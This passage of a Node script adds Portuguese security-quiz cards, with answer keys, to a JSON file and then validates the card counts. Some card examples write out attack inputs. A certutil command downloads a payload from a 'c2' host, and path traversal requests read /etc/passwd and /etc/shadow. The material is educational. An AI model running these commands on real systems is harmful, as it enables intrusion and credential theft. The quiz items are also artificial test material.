    category: "LGPD",
    difficulty: "Difícil",
    question: "Como a LGPD se aplica a empresas estrangeiras que tratam dados de titulares no Brasil?",
    options: [
      "A LGPD tem aplicação extraterritorial: aplica-se a qualquer organização que trate dados de pessoas localizadas no Brasil, independentemente de onde esteja sediada",
      "A LGPD aplica-se apenas a empresas com sede no Brasil ou com CNPJ ativo",
      "Empresas estrangeiras estão sujeitas apenas à legislação de seu país de origem",
      "A LGPD aplica-se a estrangeiras somente se tiverem funcionários no Brasil",
    ],
    correctIndex: 0,
    explanation:
      "Art. 3º LGPD: aplica-se ao tratamento de dados: (I) realizado no Brasil, (II) com objetivo de oferecer bens ou serviços a pessoas no Brasil, ou (III) cujos dados foram coletados no Brasil. Similar ao GDPR (Art. 3º): alcance baseado na localização do titular, não da empresa. Empresas estrangeiras com usuários brasileiros devem nomear representante no Brasil.",
    example:
      "'Startup americana lança app para usuários brasileiros. Mesmo sem escritório no Brasil, está sujeita à LGPD: precisa de política de privacidade em português, base legal para cada tratamento, DPO/representante no Brasil e notificação de incidentes à ANPD.'",
  },

  // ─── Malwares: +1F +1M +1D ─────────────────────────────────────────────
  {
    id: "seguranca-da-informacao__Malwares__Fácil__10",
    tags: ["macro-virus", "office", "document-malware"],
    track: "seguranca-da-informacao",
    category: "Malwares",
    difficulty: "Fácil",
    question: "O que é um vírus de macro e em que tipo de arquivo costuma se propagar?",
    options: [
      "Malware embutido em macros de documentos Office (Word, Excel) que é executado ao abrir o arquivo com macros habilitadas",
      "Vírus que infecta o setor de inicialização (boot) do disco rígido",
      "Malware que se propaga exclusivamente por e-mail como anexo .exe",
      "Tipo de spyware que monitora macros de teclado (atalhos)",
    ],
    correctIndex: 0,
    explanation:
      "Vírus de macro: usa a linguagem VBA (Visual Basic for Applications) em documentos Office. Vetor comum: e-mail com 'invoice.docx' que pede para habilitar macros. Ao habilitá-las, o código VBA executa e pode baixar payload adicional. Proteção: desabilitar macros por padrão (GPO), usar Protected View, sandboxing de anexos.",
    example:
      "'E-mail: Olá, segue nota fiscal (attachment: NF_Compra.xlsm). Ao abrir, o Excel pede para habilitar macros. Se o usuário aceitar, a macro VBA executa PowerShell que baixa e instala um RAT. Macro maliciosa clássica.'",
  },
  {
    id: "seguranca-da-informacao__Malwares__Médio__10",
    tags: ["dll-injection", "process-injection", "evasion"],
    track: "seguranca-da-informacao",
    category: "Malwares",
    difficulty: "Médio",
    question: "O que é injeção de DLL (DLL Injection) e por que é uma técnica comum em malware?",
    options: [
      "Técnica que força um processo legítimo a carregar uma DLL maliciosa, executando código no contexto do processo alvo para evitar detecção",
      "Substituição de arquivos DLL do sistema operacional por versões comprometidas",
      "Injeção de código SQL malicioso em bibliotecas de acesso a banco de dados",
      "Técnica exclusiva de rootkits para persistir no kernel do Windows",
    ],
    correctIndex: 0,
    explanation:
      "DLL Injection: o malware usa APIs do Windows (CreateRemoteThread, WriteProcessMemory) para injetar sua DLL em um processo confiável (ex: explorer.exe, svchost.exe). O código malicioso roda no contexto do processo legítimo, dificultando detecção por antivírus. Variantes: DLL side-loading, reflective DLL injection. Detectado por EDR via monitoramento de chamadas de API.",
    example:
      "'Malware injeta DLL em explorer.exe. O antivírus vê apenas atividade do explorer — processo confiável. O EDR, monitorando WriteProcessMemory + CreateRemoteThread em processos remotos, detecta e bloqueia a injeção.'",
  },
  {
    id: "seguranca-da-informacao__Malwares__Difícil__10",
    tags: ["living-off-the-land", "lolbins", "fileless", "evasion"],
    track: "seguranca-da-informacao",
    category: "Malwares",
    difficulty: "Difícil",
    question: "O que é a técnica Living off the Land (LotL) e como dificulta a detecção por soluções tradicionais de segurança?",
    options: [
      "Usar ferramentas legítimas do sistema (PowerShell, WMI, certutil) para atividade maliciosa, sem dropar novos executáveis — antivírus não detecta binários maliciosos inexistentes",
      "Técnica de malware que vive exclusivamente na memória RAM sem jamais gravar no disco",
      "Ataque que usa exclusivamente vulnerabilidades zero-day para evitar patches",
      "Modificação de binários legítimos do sistema operacional para inserir backdoors",
    ],
    correctIndex: 0,
    explanation:
      "LotL (LOLBins — Living Off the Land Binaries): atacantes usam ferramentas pré-instaladas (certutil para download, PowerShell para execução, regsvr32 para bypass de AppLocker, mshta para executar scripts). Como são binários assinados e legítimos, antivírus por assinatura não os bloqueia. Detecção exige análise comportamental (EDR), logging de PowerShell (ScriptBlock), AMSI.",
    example:
      "'Atacante usa: certutil.exe -urlcache -f http://c2/payload.exe p.exe (download), então wmic process call create p.exe (execução sem shell). Nenhum executável malicioso novo — apenas Windows built-ins. SIEM com detecção comportamental identifica padrão.'",
  },

  // ─── Normas ISO 27001/27002: +1F +1M +1D ──────────────────────────────
  {
    id: "seguranca-da-informacao__Normas ISO 27001/27002__Fácil__10",
    tags: ["iso27001", "mandatory-requirements", "certification"],
    track: "seguranca-da-informacao",
    category: "Normas ISO 27001/27002",
    difficulty: "Fácil",
    question: "Quais são as cláusulas obrigatórias da ISO 27001 para obter certificação?",
    options: [
      "Cláusulas 4 a 10 são obrigatórias (contexto, liderança, planejamento, suporte, operação, avaliação e melhoria) — o Anexo A é selecionável via SoA",
      "Todas as cláusulas e todos os controles do Anexo A são obrigatórios",
      "Apenas as cláusulas 6 (planejamento) e 9 (avaliação) são avaliadas na certificação",
      "Apenas os controles do Anexo A são obrigatórios; as cláusulas são recomendações",
    ],
    correctIndex: 0,
    explanation:
      "ISO 27001 estrutura: Cláusulas 4-10 são TODOS obrigatórios para a certificação. Anexo A (93 controles na versão 2022): a organização seleciona os controles aplicáveis via SoA (Statement of Applicability), justificando inclusões e exclusões. Controles não implementados precisam de justificativa documentada.",
    example:
      "'Na auditoria de certificação: auditor verificou as cláusulas 4-10 (obrigatórias) e revisou o SoA — a empresa excluiu o controle A.5.7 (threat intelligence) justificando escopo reduzido. Justificativa aceita, certificação concedida.'",
  },
  {
    id: "seguranca-da-informacao__Normas ISO 27001/27002__Médio__10",
    tags: ["iso27001", "clause4", "context", "interested-parties"],
    track: "seguranca-da-informacao",
    category: "Normas ISO 27001/27002",
    difficulty: "Médio",
    question: "O que a Cláusula 4 da ISO 27001 (Contexto da Organização) exige?",
    options: [
      "Compreender o contexto interno/externo, identificar partes interessadas e seus requisitos, e definir o escopo do SGSI",
      "Definir os objetivos de segurança da informação para o próximo ano",
      "Descrever a topologia de rede e os ativos de TI da organização",
      "Elaborar a política de segurança e obter aprovação da liderança",
    ],
    correctIndex: 0,
    explanation:
      "Cláusula 4 exige: (4.1) contexto interno e externo — questões internas (cultura, maturidade) e externas (regulações, mercado, ameaças); (4.2) necessidades e expectativas de partes interessadas — clientes, reguladores, acionistas; (4.3) escopo do SGSI — limites organizacionais, tecnológicos, físicos. Essa análise alimenta toda a gestão de riscos.",
    example:
      "'Fintech mapeou contexto: externo (LGPD, BACEN 4.658, GDPR para clientes europeus); interno (startup em crescimento, equipe reduzida). Partes interessadas: BACEN (regulador), clientes (dados pessoais), investidores (reputação). Escopo SGSI: plataforma de pagamentos e sistemas de suporte.'",
  },
  {
    id: "seguranca-da-informacao__Normas ISO 27001/27002__Difícil__10",
    tags: ["iso27001-2022", "supply-chain", "tprm", "clause-5-19"],
    track: "seguranca-da-informacao",
    category: "Normas ISO 27001/27002",
    difficulty: "Difícil",
    question: "Como a ISO 27001:2022 trata segurança na cadeia de fornecimento (supply chain security)?",
    options: [
      "Introduziu controles específicos para segurança de ICT supply chain (A.5.21) e gestão de serviços em nuvem (A.5.23), reconhecendo riscos de terceiros e fornecedores de software",
      "A versão 2022 removeu requisitos de fornecedores por ser responsabilidade exclusiva do GDPR",
      "Manteve exatamente os mesmos controles da versão 2013 sem alterações na área de supply chain",
      "Exige que a organização audite o código-fonte de todos os fornecedores de software",
    ],
    correctIndex: 0,
    explanation:
      "ISO 27001:2022 Anexo A — novos controles relevantes para supply chain: A.5.19 (Segurança da informação nas relações com fornecedores), A.5.20 (Acordo de segurança para fornecedores), A.5.21 (Gestão de segurança da informação em ICT supply chain — software, hardware), A.5.22 (Monitoramento e revisão de fornecedores), A.5.23 (Segurança no uso de serviços em nuvem). Resposta ao ataque SolarWinds.",
    example:
      "'Pós-SolarWinds, empresas certificadas ISO 27001:2022 agora precisam: verificar integridade de atualizações de fornecedores (SBOM), incluir requisitos de segurança em contratos cloud (A.5.23) e monitorar continuamente prestadores críticos (A.5.22).'",
  },

  // ─── Políticas de Segurança: +1F +1M +1D ──────────────────────────────
  {
    id: "seguranca-da-informacao__Políticas de Segurança__Fácil__10",
    tags: ["byod", "mobile-security", "policy"],
    track: "seguranca-da-informacao",
    category: "Políticas de Segurança",
    difficulty: "Fácil",
    question: "O que é uma política de BYOD (Bring Your Own Device)?",
    options: [
      "Política que regula o uso de dispositivos pessoais dos funcionários para acessar recursos corporativos, definindo controles e responsabilidades",
      "Proibição total do uso de dispositivos pessoais no ambiente de trabalho",
      "Política que obriga funcionários a trazer seus próprios computadores ao escritório",
      "Regras de segurança exclusivas para smartphones fornecidos pela empresa",
    ],
    correctIndex: 0,
    explanation:
      "BYOD permite que funcionários usem seus dispositivos pessoais (smartphone, notebook) para trabalho. A política define: quais dispositivos são permitidos, requisitos mínimos (senha de tela, criptografia, antimalware), MDM (Mobile Device Management) para gestão, separação entre dados pessoais e corporativos (containerização), e procedimentos em caso de perda/roubo.",
    example:
      "'Política BYOD da empresa: smartphones com iOS 16+ ou Android 13+ com biometria ativa; instalação do MDM (Intune) obrigatória; dados corporativos em container separado. Se dispositivo for perdido, TI pode limpar remotamente apenas o container corporativo, preservando fotos pessoais.'",
  },
  {
    id: "seguranca-da-informacao__Políticas de Segurança__Médio__10",
    tags: ["asset-management", "information-asset", "classification"],
    track: "seguranca-da-informacao",
    category: "Políticas de Segurança",
    difficulty: "Médio",
    question: "Por que a gestão de ativos de informação é fundamental para políticas de segurança?",
    options: [
      "Sem saber quais ativos existem e seu valor, é impossível priorizar controles — não se pode proteger o que não se conhece",
      "Apenas para fins contábeis e depreciação de hardware de TI",
      "Gestão de ativos é responsabilidade exclusiva da área financeira, não de segurança",
      "Importante apenas para grandes organizações com mais de 500 funcionários",
    ],
    correctIndex: 0,
    explanation:
      "Gestão de ativos (ISO 27001 A.5.9, CIS Control 1 e 2): inventário de hardware e software, classificação por criticidade/confidencialidade, definição de dono (asset owner). Sem inventário: shadow IT não monitorado, sistemas esquecidos sem patches, dados críticos sem controles adequados. 'You can't protect what you don't know you have.'",
    example:
      "'Empresa passou por auditoria e descobriu 40 servidores 'esquecidos' rodando Windows Server 2008 sem patches — eram de um projeto extinto. Nenhum estava no inventário. Um deles foi vetor do breach. Inventário automatizado (ex: Lansweeper, Tenable) teria detectado.'",
  },
  {
    id: "seguranca-da-informacao__Políticas de Segurança__Difícil__10",
    tags: ["bug-bounty", "vdp", "responsible-disclosure"],
    track: "seguranca-da-informacao",
    category: "Políticas de Segurança",
    difficulty: "Difícil",
    question: "O que é um programa de Bug Bounty e como se diferencia de um VDP (Vulnerability Disclosure Policy)?",
    options: [
      "Bug Bounty paga pesquisadores por vulnerabilidades encontradas; VDP define como reportar sem remuneração — ambos são canais organizados de divulgação responsável",
      "Bug Bounty é exclusivamente para funcionários internos; VDP é para o público externo",
      "VDP é obrigatório por lei; Bug Bounty é optativo e exclusivo de empresas de tecnologia",
      "São sinônimos — ambos pagam pesquisadores externos para reportar vulnerabilidades",
    ],
    correctIndex: 0,
    explanation:
      "VDP (Vulnerability Disclosure Policy): canal formal para pesquisadores reportarem vulnerabilidades — sem pagamento, mas com comprometimento de não processar e resolver dentro de prazo. Bug Bounty: adiciona remuneração (bounty) proporcional à criticidade. Plataformas: HackerOne, Bugcrowd. Benefícios: crowdsourced security testing contínuo, vulnerabilidades encontradas antes de atacantes.",
    example:
      "'Google paga até US$31.337 por RCE no Chrome (Bug Bounty). Uma startup sem orçamento implementa apenas VDP — pesquisadores podem reportar sem medo de ações legais, empresa se compromete a corrigir em 90 dias. Ambos são melhores que nenhuma política.'",
  },

  // ─── Segurança em Aplicações Web: +1F +1M +1D ─────────────────────────
  {
    id: "seguranca-da-informacao__Segurança em Aplicações Web__Fácil__10",
    tags: ["cookies", "secure-flag", "httponly", "web-security"],
    track: "seguranca-da-informacao",
    category: "Segurança em Aplicações Web",
    difficulty: "Fácil",
    question: "Para que servem as flags 'Secure' e 'HttpOnly' em cookies?",
    options: [
      "Secure: envia o cookie apenas em HTTPS; HttpOnly: impede acesso ao cookie via JavaScript, protegendo contra XSS",
      "Secure: criptografa o conteúdo do cookie; HttpOnly: torna o cookie válido apenas no servidor",
      "Secure: impede que o cookie expire; HttpOnly: permite acesso apenas a usuários autenticados",
      "São sinônimas e podem ser usadas intercambiavelmente",
    ],
    correctIndex: 0,
    explanation:
      "Secure flag: o browser só envia o cookie em conexões HTTPS, evitando vazamento em conexões HTTP. HttpOnly flag: o cookie não pode ser acessado via document.cookie em JavaScript — protege cookies de sessão contra roubo por XSS. SameSite (Strict/Lax/None) complementa: controla envio cross-site (mitigação CSRF).",
    example:
      "Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict — cookie de sessão ideal: só HTTPS, inacessível ao JS, só enviado no mesmo site. Sem HttpOnly, um script XSS poderia fazer document.cookie para roubar a sessão.",
  },
  {
    id: "seguranca-da-informacao__Segurança em Aplicações Web__Médio__10",
    tags: ["path-traversal", "directory-traversal", "file-inclusion"],
    track: "seguranca-da-informacao",
    category: "Segurança em Aplicações Web",
    difficulty: "Médio",
    question: "O que é path traversal (directory traversal) e como se proteger?",
    options: [
      "Ataque que usa sequências '../' para navegar fora do diretório permitido e acessar arquivos arbitrários do servidor",
      "Ataque DDoS que sobrecarrega o servidor com requisições a caminhos inexistentes",
      "Técnica de enumeração de diretórios para mapear a estrutura do servidor",
      "Vulnerabilidade que permite incluir arquivos remotos via URL na aplicação",
    ],
    correctIndex: 0,
    explanation:
      "Path traversal: se a aplicação usa input do usuário para construir caminhos de arquivo sem validação, um atacante pode usar '../' para sair do diretório permitido. Exemplo: GET /file?name=../../etc/passwd — retorna o arquivo de senhas. Prevenção: canonicalizar o caminho, validar que o caminho resultante está dentro do diretório base, usar APIs seguras (java.nio.file.Path.normalize), jamais concatenar input diretamente a caminhos.",
    example:
      "GET /download?file=../../../etc/shadow — obtém o arquivo de hashes de senhas do Linux. Fix: Path basePath = Paths.get('/uploads'); Path resolved = basePath.resolve(userInput).normalize(); if (!resolved.startsWith(basePath)) throw new SecurityException();",
  },
  {
    id: "seguranca-da-informacao__Segurança em Aplicações Web__Difícil__10",
    tags: ["http-request-smuggling", "desync", "proxy"],
    track: "seguranca-da-informacao",
    category: "Segurança em Aplicações Web",
    difficulty: "Difícil",
    question: "O que é HTTP Request Smuggling e como a ambiguidade entre frontend e backend permite explorá-lo?",
    options: [
      "Explora inconsistência na interpretação de Content-Length vs Transfer-Encoding entre proxy e servidor backend, permitindo 'contrabandear' requisições não autorizadas",
      "Técnica de injetar headers HTTP maliciosos em respostas para envenenar cache",
      "Ataque que duplica requisições HTTP para causar processamento duplo no servidor",
      "Método de bypassar WAF ocultando payloads maliciosos em headers HTTP customizados",
    ],
    correctIndex: 0,
    explanation:
      "HTTP Request Smuggling (PortSwigger research): quando frontend (load balancer/WAF) e backend interpretam onde uma requisição termina de forma diferente (CL-TE, TE-CL, TE-TE), o corpo de uma requisição pode ser 'contrabandado' como início da próxima requisição de outro usuário. Impactos: bypass de controles de segurança, acessar endpoints internos, envenenar cache, sequestrar sessões de outros usuários.",
    example:
      "'Requisição CL-TE: frontend usa Content-Length (11), backend usa Transfer-Encoding: chunked. O atacante envia 'G' como corpo, que o backend interpreta como início de GET de outro usuário — contrabandeia um GET /admin para a próxima requisição processada.'",
  },
];

// Adicionar os novos cards ao array existente
const updated = [...data, ...newCards];

// Validar que não há IDs duplicados
const ids = updated.map((c) => c.id);
const unique = new Set(ids);
if (unique.size !== ids.length) {
  const dupes = ids.filter((id, i) => ids.indexOf(id) !== i);
  console.error("IDs DUPLICADOS:", dupes);
  process.exit(1);
}

fs.writeFileSync(FILE, JSON.stringify(updated, null, 2) + "\n", "utf-8");
console.log(`Arquivo atualizado: ${updated.length} cards total (+${newCards.length} novos)`);

// Verificar contagens por categoria e dificuldade
const byKey = {};
updated.forEach((c) => {
  const k = c.category + "__" + c.difficulty;
  byKey[k] = (byKey[k] || 0) + 1;
});
const cats = {};
updated.forEach((c) => { cats[c.category] = (cats[c.category] || 0) + 1; });
Object.entries(cats).sort().forEach(([k, v]) =>
  console.log(k + ":", v, v === 30 ? "✓" : "✗ PRECISA DE " + (30 - v))
);
